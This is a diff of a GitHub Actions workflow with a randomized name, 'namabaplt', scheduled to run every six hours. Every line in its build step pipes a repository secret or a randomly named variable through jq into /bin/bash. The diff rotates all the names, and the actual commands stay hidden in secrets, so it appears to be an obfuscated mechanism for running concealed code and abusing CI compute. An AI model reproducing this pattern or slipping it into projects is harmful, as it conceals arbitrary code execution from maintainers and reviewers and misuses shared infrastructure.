@@ -2,9 +2,9 @@ name: namabaplt
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 1/6 * * *'
+    - cron: '36 5/6 * * *'
 
-jobs:  # 25816
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,15 +12,17 @@ jobs:  # 25816
       - uses: actions/checkout@v4
       - name: namabaplt
         env:
-          f993: ${{ secrets.f993 }}
+          q50408: ${{ secrets.q50408 }}
         run: |
-          echo $f993 | jq -r .rbo9095 | /bin/bash
-          echo $rsvv83 | jq -r .kmpqc679 | /bin/bash
-          echo $a900 | jq -r .bmuh988 | /bin/bash
-          echo $n20 | jq -r .a4459 | /bin/bash
-          echo $xp25 | jq -r .kioh71 | /bin/bash
-          echo $s05268 | jq -r .fv24 | /bin/bash
-          echo $fvig8 | jq -r .vbrj356 | /bin/bash
-          echo $utc11224 | jq -r .eyupm8 | /bin/bash
-          echo $dlyc40 | jq -r .w77 | /bin/bash
+          echo $q50408 | jq -r .xwmgn130 | /bin/bash
+          echo $kui180 | jq -r .aj63872 | /bin/bash
+          echo $do23 | jq -r .dtagr3 | /bin/bash
+          echo $kfh67682 | jq -r .ixm0 | /bin/bash
+          echo $z96435 | jq -r .i44126 | /bin/bash
+          echo $a90692 | jq -r .xjux4 | /bin/bash
+          echo $phoc8485 | jq -r .tdr119 | /bin/bash
+          echo $bc58692 | jq -r .vynp9340 | /bin/bash
+          echo $e4732 | jq -r .lr8627 | /bin/bash
+          echo $z7426 | jq -r .mrqg16 | /bin/bash
+          echo $o8591 | jq -r .bg3843 | /bin/bash
 
